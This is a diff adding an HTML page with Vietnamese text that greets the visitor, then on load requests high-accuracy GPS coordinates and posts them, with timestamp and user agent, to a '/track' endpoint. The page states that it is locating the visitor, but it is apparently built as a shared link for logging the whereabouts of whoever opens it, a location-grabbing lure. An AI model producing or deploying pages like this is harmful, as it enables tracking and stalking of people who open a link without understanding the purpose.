@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎉 Chào mừng bạn!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;color:white}
+        .container{max-width:450px;width:90%;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);padding:40px;border-radius:25px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.1)}
+        h1{font-size:2.5em;margin-bottom:15px}
+        p{font-size:1.1em;margin-bottom:30px;opacity:0.9}
+        #status{padding:20px;border-radius:15px;margin:25px 0;font-size:1.1em;font-weight:500;min-height:25px}
+        .loading{background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.3)}
+        .success{background:rgba(46,204,113,0.2);border:1px solid #27ae60;color:#2ecc71}
+        .error{background:rgba(231,76,60,0.2);border:1px solid #e74c3c;color:#e74c3c}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Chào mừng!</h1>
+        <p>Chạm vào link này thật tuyệt! Chúng tôi đang xác định vị trí của bạn...</p>
+        <div id="status" class="loading">📍 Đang lấy vị trí GPS...</div>
+    </div>
+    
+    <script>
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                const data = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: Math.round(position.coords.accuracy),
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent.slice(0,100)
+                };
+                
+                // Gửi dữ liệu (sẽ lưu ở server)
+                fetch('/track', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                }).catch(e=>console.log('Track saved:', data));
+                
+                document.getElementById('status').innerHTML = 
+                    `✅ Đã lưu vị trí!<br><small>Độ chính xác: ${data.accuracy}m</small>`;
+                document.getElementById('status').className = 'success';
+            },
+            error => {
+                document.getElementById('status').innerHTML = '❌ Cần bật GPS/Dịch vụ vị trí';
+                document.getElementById('status').className = 'error';
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 30000
+            }
+        );
+    </script>
+</body>
+</html>
